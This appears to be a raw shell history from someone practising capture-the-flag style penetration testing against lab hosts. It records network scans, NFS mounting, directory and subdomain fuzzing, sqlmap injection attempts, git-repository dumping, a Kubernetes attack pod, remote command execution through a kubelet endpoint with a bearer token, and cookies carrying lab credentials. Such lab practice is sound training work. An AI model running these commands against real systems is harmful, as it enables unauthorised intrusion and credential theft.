+ 2138  k_admin get pods -n kube-system
+ 2139  k_admin get pods
+ 2140  k_admin get pods -o yaml | grep image
+ 2141  nano attack_pods.yml
+ 2142  mv attack_pods.yml attack_pods.yaml
+ 2143  clear
+ 2144  nano attack_pods.yaml
+ 2145  k_admin apply -f attack_pods.yaml
+ 2146  k_admin get pods
+ 2147  nano attack_pods.yaml
+ 2148  k_admin delete -f attack_pods.yaml
+ 2149  k_admin apply -f attack_pods.yaml
+ 2150  nano attack_pods.yaml
+ 2151  k_admin apply -f attack_pods.yaml
+ 2152  k_admin get pods
+ 2153  k_admin exec -it attacker-pod -- bash
+ 2154  k_admin exec -it attacker-pod -- sh
+ 2155  exit
+ 2156  env
+ 2157  k
+ 2158  exit
+ 2159  brew
+ 2160  brew update
+ 2161  which python
+ 2162  brew uninstall python
+ 2163  clear
+ 2164  brew upgrade
+ 2165  asdf 
+ 2166  asdf update
+ 2167  asdf latest --al
+ 2168  asdf latest --all
+ 2169  asdf list golang
+ 2170  asdf plugin list
+ 2171  asdf plugin-update --all
+ 2172  clear
+ 2173  asdf list kubectl
+ 2174  asdf install kubectl latest
+ 2175  clear
+ 2176  asdf current 
+ 2177  clear
+ 2178  sudo brew services restart openvpn
+ 2179  brew services restart openvpn
+ 2180  clear
+ 2181  brew update
+ 2182  exit
+ 2183  nmap -A 10.10.237.38
+ 2184  nmap -A 10.10.237.38 -vvv
+ 2185  clear
+ 2186  nmap -sC -sV  10.10.237.38 -vvv
+ 2187  telnet 10.10.237.38 111
+ 2188  rpcinfo
+ 2189  rpcinfo -p 10.10.237.38
+ 2190  showmount -e 10.10.237.38
+ 2191  cat /opt/server_backups/SRVER-19217-9593a0
+ 2192  ls
+ 2193  cd ctfs
+ 2194  ls
+ 2195  mkdir crypted
+ 2196  mount -t nfs [-o vers=2] 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 ctfs/crypted -o nolock
+ 2197  mount -t nfs 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 ctfs/crypted -o nolock
+ 2198  mount -t nfs -o vers=2 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 ctfs/crypted -o nolock
+ 2199  mount -t nfs [-o vers=2] 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 ctfs/crypted -o nolock
+ 2200  mount --help
+ 2201  mount -h
+ 2202  mount -t nfs 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 ctfs/crypted 
+ 2203  mount -t nfs 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 ctfs/crypted -o nolock
+ 2204  mount -o nolock,vers=2 -t nfs 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 ctfs/crypted
+ 2205  mount -o nolock -t nfs 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 ctfs/crypted
+ 2206  sudo mount -o nolock -t nfs 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 ctfs/crypted
+ 2207  sudo mount -t nfs 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 ctfs/crypted
+ 2208  sudo mkdir /private/nfs
+ 2209  sudo mount -t nfs 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 /private/nfs
+ 2210  sudo mount -o nolock -t nfs 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 /private/nfs
+ 2211  sudo mount -o nolock,resvport -t nfs 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 /private/nfs
+ 2212  ls /private/nfs
+ 2213  cd /private/nfs
+ 2214  ll
+ 2215  clear
+ 2216  ls
+ 2217  ll
+ 2218  clear
+ 2219  ls
+ 2220  binwalk backup.img
+ 2221  ll
+ 2222  binwalk -e backup.img
+ 2223  binwalk
+ 2224  binwalk -e backup.img -C /Users/felipe/ctfs/crypted
+ 2225  cd crypted
+ 2226  ls
+ 2227  l
+ 2228  ll
+ 2229  cd _backup.img.extracted
+ 2230  ls
+ 2231  ll
+ 2232  cd ..
+ 2233  binwalk --dd=".*" backup.img -C /Users/felipe/ctfs/crypted
+ 2234  ll
+ 2235  clear
+ 2236  ls
+ 2237  rm _backup.img-0.extracted
+ 2238  rm -rf _backup.img-0.extracted
+ 2239  rm -rf _backup.img.extracted
+ 2240  binwalk -e backup.img -C /Users/felipe/ctfs/crypted
+ 2241  ll
+ 2242  cd _backup.img.extracted
+ 2243  clear
+ 2244  ls
+ 2245  ll
+ 2246  binwalk -Me backup.img -C /Users/felipe/ctfs/crypted
+ 2247  cd ..
+ 2248  ll
+ 2249  cd _backup.img.extracted
+ 2250  ll
+ 2251  l
+ 2252  ll
+ 2253  l
+ 2254  cd ..
+ 2255  clear
+ 2256  ls
+ 2257  rm -rf _backup.img.extracted
+ 2258  cd ..
+ 2259  cd crypted
+ 2260  binwalk backup.img
+ 2261  clear
+ 2262  VBoxManage internalcommands createrawvmdk -filename /Users/felipe/ctfs/crypted/rawtest.vmdk -rawdisk backup.img\n
+ 2263  VBoxManage convertdd backup.img /Users/felipe/ctfs/crypted/raw.vdi
+ 2264  ll
+ 2265  cp backup.img /Users/felipe/ctfs/crypted
+ 2266  ll
+ 2267  umount /private/nfs
+ 2268  sudo umount /private/nfs
+ 2269  clear
+ 2270  sudo mount -o nolock,resvport,rw -t nfs 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 /private/nfs
+ 2271  rm backup.img raw.vdi
+ 2272  clear
+ 2273  cd /private/nfs
+ 2274  ls
+ 2275  ll
+ 2276  cp backup.img /Users/felipe/ctfs/crypted
+ 2277  ll
+ 2278  ls
+ 2279  kk
+ 2280  ll
+ 2281  clear
+ 2282  sudo umount /private/nfs
+ 2283  exit
+ 2284  sudo umount /private/nfs
+ 2285  nmap -sC -sV  10.10.237.38 -vvv
+ 2286  clear
+ 2287  sudo mount -o nolock,resvport,rw -t nfs 10.10.237.38:/opt/server_backups/SRVER-19217-9593a0 /private/nfs
+ 2288  cd /private/nfs
+ 2289  ls
+ 2290  file backup.img
+ 2291  fls
+ 2292  ls -i raw
+ 2293  ls -h
+ 2294  icat
+ 2295  sudo mkdir /Users/felipe/ctfs/crypted/disk
+ 2296  sudo mount -o loop backup.img /Users/felipe/ctfs/crypted/disk
+ 2297  mount -h
+ 2298  man mount
+ 2299  sudo mount -o loop -t ext4 backup.img /Users/felipe/ctfs/crypted/disk
+ 2300  clear
+ 2301  cd ~
+ 2302  sudo umount /private/nfs
+ 2303  sudo umount /private/nfs -f
+ 2304  sudo umount -f /private/nfs
+ 2305  exit
+ 2306  rpcinfo -p 10.10.237.38
+ 2307  ls .ssh
+ 2308  ll .ssh
+ 2309  nmap -sC -sV  10.10.237.38 -vvv
+ 2310  nmap -sC -sV 10.10.198.170 -vvv
+ 2311  exit
+ 2312  ls
+ 2313  cd Downloads
+ 2314  ls
+ 2315  cd sensor_saida_teste
+ 2316  ls
+ 2317  pwd
+ 2318  clear
+ 2319  cp sensor_saida_colocado-Table\ 1.csv sensor_saida.csv
+ 2320  ls
+ 2321  clear
+ 2322  ls
+ 2323  pwd
+ 2324  ls
+ 2325  source /Users/felipe/Desktop/projetos/tcc/venv/bin/activate
+ 2326  python teste.py
+ 2327  clear
+ 2328  cd ..
+ 2329  cd ctfs
+ 2330  cd crypted
+ 2331  clear
+ 2332  nmap -sC -sV 10.10.29.69
+ 2333  sudo nano /etc/hosts
+ 2334  clear
+ 2335  nmap -sC -sV 10.10.29.69 --scripts=vuln -vvv
+ 2336  nmap -sC -sV --scripts=vuln -vvv 10.10.29.69
+ 2337  nmap -sC -sV --script=vuln -vvv 10.10.29.69
+ 2338  showmount -e deadsystems.thm
+ 2339  gobuster dir -u https://deadsystems.thm/ -w ../Documents/wordlist/Discovery/Web-Content/big.txt
+ 2340  gobuster dir -u https://deadsystems.thm/ -w ~/Documents/wordlist/Discovery/Web-Content/big.txt
+ 2341  gobuster --help
+ 2342  gobuster dir 
+ 2343  gobuster dir  --help 
+ 2344  gobuster dir -u https://deadsystems.thm/ -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -k
+ 2345  showmount -e 10.10.29.69
+ 2346  cd ..
+ 2347  ls
+ 2348  cd ac
+ 2349  cd aoc3
+ 2350  lss
+ 2351  ls
+ 2352  clear
+ 2353  cd ..
+ 2354  ls
+ 2355  ll
+ 2356  python -V
+ 2357  pip install git-dumper
+ 2358  clear
+ 2359  git-dumper
+ 2360  git-dumper https://deadsystems.thm/ .
+ 2361  git-dumper https://deadsystems.thm/ ./git_dir
+ 2362  ls
+ 2363  ll
+ 2364  cd git_dir
+ 2365  ls
+ 2366  ll
+ 2367  cd ..
+ 2368  tree
+ 2369  cd disk
+ 2370  ls
+ 2371  ll
+ 2372  cd ...
+ 2373  cd crypted
+ 2374  clear
+ 2375  ls
+ 2376  rm disk
+ 2377  ll
+ 2378  rm backup.img
+ 2379  rm git_dir
+ 2380  clear
+ 2381  rm -rf git_dir
+ 2382  clear
+ 2383  ffuf -w Documents/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.deadsystems.thm" -u https://10.10.29.69
+ 2384  ffuf -w ~/Documents/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.deadsystems.thm" -u https://10.10.29.69
+ 2385  ffuf --hwlp
+ 2386  ffuf -w ~/Documents/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.deadsystems.thm" -u https://10.10.29.69 -ac
+ 2387  ffuf -w ~/Documents/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.deadsystems.thm" -u http://10.10.29.69 -ac -r 
+ 2388  ffuf -w ~/Documents/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.deadsystems.thm" -u https://10.10.29.69 -ac -r 
+ 2389  smbd
+ 2390  msfconsole
+ 2391  msfvenon
+ 2392  msfvenom
+ 2393  smbutil --help
+ 2394  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \\n  chmod 755 msfinstall && \\n  ./msfinstall
+ 2395  msfconsole
+ 2396  ls /
+ 2397  ls
+ 2398  ll
+ 2399  ./msfinstall
+ 2400  ls
+ 2401  rm msfinstall
+ 2402  ll
+ 2403  ll disk
+ 2404  rm -rf disk
+ 2405  ll
+ 2406  ls /opt
+ 2407  ll /opt/metasploit-framework/
+ 2408  ls
+ 2409  cd /opt/metasploit-framework/bin
+ 2410  ls
+ 2411  pwd
+ 2412  ./msf
+ 2413  ./msfconsole
+ 2414  ping 1.1.1.1
+ 2415  ifconfig
+ 2416  ping 1.1.1.1
+ 2417  cd ~/ctfs
+ 2418  cd crypted
+ 2419  clear
+ 2420  ls
+ 2421  ll
+ 2422  strings 150001.png
+ 2423  exiftools
+ 2424  exiftool
+ 2425  exif
+ 2426  clea
+ 2427  steghide
+ 2428  brew install steghide
+ 2429  file 150001.png
+ 2430  binwalk -e 150001.png
+ 2431  ll
+ 2432  cd _150001.png.extracted
+ 2433  ls
+ 2434  ll
+ 2435  cd ..
+ 2436  rm -f _150001.png.extracted 
+ 2437  rm -rf _150001.png.extracted 
+ 2438  clear
+ 2439  lbinwalk --help
+ 2440  binwalk --help
+ 2441  binwalk -e 150001.png
+ 2442  ll
+ 2443  cd _150001.png.extracted
+ 2444  clear
+ 2445  ls
+ 2446  ll
+ 2447  cat 2C9
+ 2448  cat 2C9.zlib
+ 2449  ll
+ 2450  strings 2C9
+ 2451  strings 2C9.zlib
+ 2452  extract 2C9.zlib
+ 2453  extract 2C9
+ 2454  gzip --help
+ 2455  gzip 2C9.zlib
+ 2456  ll
+ 2457  gzip -d 2C9.zlib.gz
+ 2458  gzip -d 2C9.zlib
+ 2459  ll
+ 2460  gzip -d 2C9.zlib -S .zlib
+ 2461  zlib_decompress 2C9.zlib
+ 2462  zlib_decompress 2C9.zlib 2C9_dec
+ 2463  ll
+ 2464  cat 2C9_dec
+ 2465  file 2C9.zlib
+ 2466  file 2C9
+ 2467  ll
+ 2468  clear
+ 2469  ll
+ 2470  cat 2C9
+ 2471  cd ..
+ 2472  binwalk -e pexelsphoto1089438.jpeg
+ 2473  ll
+ 2474  brew install samba
+ 2475  smb-client
+ 2476  brew uninstall samba
+ 2477  smbutil --help
+ 2478  smbutil view
+ 2479  smbutil view //10.10.29.69
+ 2480  smbutil view -a //10.10.29.69
+ 2481  smbutil view -g //10.10.29.69
+ 2482  smbutil view -g //deadsystems.thm@10.10.29.69
+ 2483  smbutil view -a //deadsystems.thm@10.10.29.69
+ 2484  smbutil view -A //deadsystems.thm@10.10.29.69
+ 2485  gobuster dir -u https://deadsystems.thm/images -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -k
+ 2486  gobuster dir
+ 2487  gobuster dir --help
+ 2488  gobuster dir -u https://deadsystems.thm/images -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -k -x php,html,xhtml,png,jpeg
+ 2489  sqlmap -u https://deadsystems.thm/\?confirm\=%3Cscript%3Ealert\(1\)%3C/script%3E
+ 2490  sqlmap -u https://deadsystems.thm/?confirm="
+ 2491  sqlmap -u "https://deadsystems.thm/?confirm="
+ 2492  sqlmap -u "https://deadsystems.thm/?confirm=" --risk=5
+ 2493  sqlmap -u "https://deadsystems.thm/?confirm=" --risk=3
+ 2494  sqlmap -u "https://deadsystems.thm/?confirm=123" --risk=3
+ 2495  sqlmap -u "https://deadsystems.thm/?confirm=123" --risk=3 --level=5 --tamper=space2comment --random-agent
+ 2496  ffuf -w ~/Documents/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.deadsystems.thm" -u https://10.10.29.69 -ac -r 
+ 2497  ffuf -w ~/Documents/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.deadsystems.thm" -u https://10.10.29.69 -ac
+ 2498  ffuf -w ~/Documents/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.deadsystems.thm" -u https://10.10.29.69 -ac -t 10
+ 2499  curl https://10.10.29.69 -H "Host: helios.deadsystems.thm"
+ 2500  curl --help
+ 2501  curl -k -X POST -H "Authorization: Bearer $(cat token)" https://192.168.49.2:10250/run/k\nbox-admin-7d56d4b67d-tcpt6/ubuntu -d "cmd=id"
+ 2502  curl https://10.10.29.69 -H "Host: helios.deadsystems.thm" -v
+ 2503  curl https://10.10.29.69 -H "Host: helios.deadsystems.thm" -vk
+ 2504  curl https://10.10.29.69/login -H "Host: helios.deadsystems.thm" -vk
+ 2505  clear
+ 2506  curl -X POST
+ 2507  curl -X POST https://10.10.29.69/login -H "Host: helios.deadsystems.thm" -vk --data="name=12312321&password=12312"
+ 2508  curl --help
+ 2509  curl -X POST https://10.10.29.69/login -H "Host: helios.deadsystems.thm" -vk --data "name=12312321&password=12312"
+ 2510  curl -X POST https://10.10.29.69/login -H "Host: helios.deadsystems.thm" -vk --data "name=12312321&pass=12312"
+ 2511  sqlmap --help
+ 2512  sqlmap -hh
+ 2513  sqlmap https://10.10.29.69/login -H "Host: helios.deadsystems.thm" --data "name=12312321&pass=12312" --risk=3 --level=5 --tamper=space2comment
+ 2514  curl -X POST https://10.10.29.69/login -H "Host: helios.deadsystems.thm" -vk --data "name=12312321&pass=12312"
+ 2515  curl -X POST https://10.10.29.69/login -H "Host: helios.deadsystems.thm" -vk --data "name=admin&pass=admin"
+ 2516  curl -X POST https://10.10.29.69/register -H "Host: helios.deadsystems.thm" -vk --data "name=admin&pass=admin"
+ 2517  curl -X POST https://10.10.29.69/register -H "Host: helios.deadsystems.thm" -vk --data "name=admin2&pass=admin"
+ 2518  curl -X POST https://10.10.29.69/login -H "Host: helios.deadsystems.thm" -vk --data "name=admin2&pass=admin"
+ 2519  curl -X POST https://10.10.29.69/login -H "Host: helios.deadsystems.thm" -vk --data "name=admin2&pass=admin
+ 2520  curl https://10.10.29.69/main -H "Host: helios.deadsystems.thm" -vk
+ 2521  curl --help
+ 2522  curl https://10.10.29.69/main -H "Host: helios.deadsystems.thm; Cookie:passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/" -vk
+ 2523  curl https://10.10.29.69/main -H "Host: helios.deadsystems.thm" -vk -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/
+ 2524  curl https://10.10.29.69/search -H "Host: helios.deadsystems.thm" -vk -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/
+ 2525  curl -X POST https://10.10.29.69/search -H "Host: helios.deadsystems.thm" -vk --data "search=patchnet" -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/
+ 2526  sqlmap https://10.10.29.69/login -H "Host: helios.deadsystems.thm" --data "name=12312321&pass=12312" --risk=3 --level=5 --tamper=space2comment --cookie="passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2527  sqlmap "https://10.10.29.69/get_password?name=patchnet" -H "Host: helios.deadsystems.thm" --risk=3 --level=5 --tamper=space2comment --cookie="passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2528  curl https://10.10.29.69/get_password\?name=admin -H "Host: helios.deadsystems.thm" -vk -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/ 
+ 2529  curl https://10.10.29.69/get_password\?name=deadsystems -H "Host: helios.deadsystems.thm" -vk -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/ 
+ 2530  curl "https://10.10.29.69/get_password\?name='" -H "Host: helios.deadsystems.thm" -vk -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/ 
+ 2531  curl "https://10.10.29.69/get_password?name='" -H "Host: helios.deadsystems.thm" -vk -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/ 
+ 2532  curl "https://10.10.29.69/create" -H "Host: helios.deadsystems.thm" -vk -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/ 
+ 2533  curl "https://10.10.29.69/get_password?name='" -H "Host: helios.deadsystems.thm" -vk -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/ 
+ 2534  hydra --help
+ 2535  hydra -h
+ 2536  curl "https://10.10.29.69/get_password?name='" -H "Host: helios.deadsystems.thm" -vk -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/ 
+ 2537  cd ctfs/crypted
+ 2538  curl "https://10.10.29.69/get_password?name='" -H "Host: helios.deadsystems.thm" -vk -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/ 
+ 2539  cd ctfs
+ 2540  cd crypted
+ 2541  clear
+ 2542  nano curls
+ 2543  curl -X POST https://10.10.29.69/register -H "Host: helios.deadsystems.thm" -vk --data "name=admin2&pass=admin"
+ 2544  sqlmap "https://10.10.29.69/get_password?name=patchnet" -H "Host: helios.deadsystems.thm" --cookie="passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2545  gobuster dir --help 
+ 2546  gobuster dir -u https://10.10.29.69 -H "host: helios.deadsystems.thm" -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -k --cookies "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98"
+ 2547  gobuster dir -u https://10.10.29.69 -H "Host: helios.deadsystems.thm" -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -k --cookies "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98"
+ 2548  gobuster dir -u https://10.10.29.69 -H 'Host: helios.deadsystems.thm' -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -k --cookies "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98"
+ 2549  gobuster dir  -H 'Host: helios.deadsystems.thm' -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -k --cookies "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98"
+ 2550  gobuster dir -u https://10.10.29.69 --headers "Host: helios.deadsystems.thm" -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -k --cookies "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98"
+ 2551  gobuster dir -u https://10.10.29.69 -H "Host: helios.deadsystems.thm" -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -k -c "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98"
+ 2552  gobuster dir -u https://10.10.29.69/ -H "Host: helios.deadsystems.thm" -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -k -c "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98"
+ 2553  ffuf -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -H "Host: deadsystems.thm" -u "https://10.10.29.69/FUZZ" -ac -t 10
+ 2554  ffuf -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -H "Host: deadsystems.thm" -u "https://10.10.29.69/FUZZ"
+ 2555  curl "https://10.10.29.69/.git" -H "Host: helios.deadsystems.thm" -vk -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/ 
+ 2556  curl "https://10.10.29.69/.git" -H "Host: deadsystems.thm" -vk -b passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/ 
+ 2557  ffuf -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -H "Host: deadsystems.thm" -u "https://10.10.29.69/FUZZ" -ac -t 10
+ 2558  ffuf -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -H "Host: helios.deadsystems.thm" -u "https://10.10.29.69/FUZZ" -ac -t 10
+ 2559  ffuf -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -H "Host: helios.deadsystems.thm" -u "https://10.10.29.69/FUZZ"
+ 2560  curl -X POST https://10.10.29.69/register -H "Host: helios.deadsystems.thm" -vk --data "name=root&pass=admin"
+ 2561  sqlmap https://10.10.29.69/login -H "Host: helios.deadsystems.thm" --data "name=root&pass=admin" --risk=3 --level=5 --tamper=space2comment --cookie="passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2562  curl -X POST https://10.10.29.69/login -H "Host: helios.deadsystems.thm" -vk --data "name=root&pass=admin"
+ 2563  ffuf -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -H "Host: helios.deadsystems.thm" -u "https://10.10.29.69/FUZZ"
+ 2564  ffuf --help
+ 2565  ffuf -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -H "Host: helios.deadsystems.thm" -u "https://10.10.29.69/FUZZ" -b "passman_authorization_token=7b22757365726e616d65223a2022726f6f74222c202270617373776f7264223a202261646d696e227d.b468c1889d99317e2abbbc371856934c3f293b1011e68eaa549dde15383192a0; Path=/"
+ 2566  ffuf -w ~/Documents/wordlist/Discovery/Web-Content/big.txt -H "Host: helios.deadsystems.thm" -u "https://10.10.29.69/FUZZ" -b "passman_authorization_token=7b22757365726e616d65223a2022726f6f74222c202270617373776f7264223a202261646d696e227d.b468c1889d99317e2abbbc371856934c3f293b1011e68eaa549dde15383192a0; Path=/" -r
+ 2567  sqlmap "https://10.10.29.69/get_password?name=patchnet" -H "Host: helios.deadsystems.thm" --cookie="passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/" --level=5 --risk=3 --tamper=space2comment --random-agent
+ 2568  curl "https://10.10.29.69/get_password?name='" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2569  curl "https://10.10.29.69/get_password?name=root" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2570  hydra --help
+ 2571  hydra -h
+ 2572  curl "https://10.10.29.69/get_password?name=thm" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2573  curl "https://10.10.29.69/get_password?name=deadsystems.thm" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2574  curl "https://10.10.29.69/get_password?name=helios.deadsystems.thm" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2575  curl "https://10.10.29.69/get_password" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2576  curl "https://10.10.29.69/create" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2577  curl "https://10.10.29.69/get_password?username=all" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2578  curl "https://10.10.29.69/get_password?name=all" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2579  curl "https://10.10.29.69/get_password?name=#" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2580  curl "https://10.10.29.69/get_password?name=*" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
+ 2581  curl "https://10.10.29.69/get_password?name=DeadSystems" -H "Host: helios.deadsystems.thm" -vk -b "passman_authorization_token=7b22757365726e616d65223a202261646d696e32222c202270617373776f7264223a202261646d696e227d.504ab5fe902fee46b4c4548bafe69c8c57451fd0075ff257c644139c28737a98; Path=/"
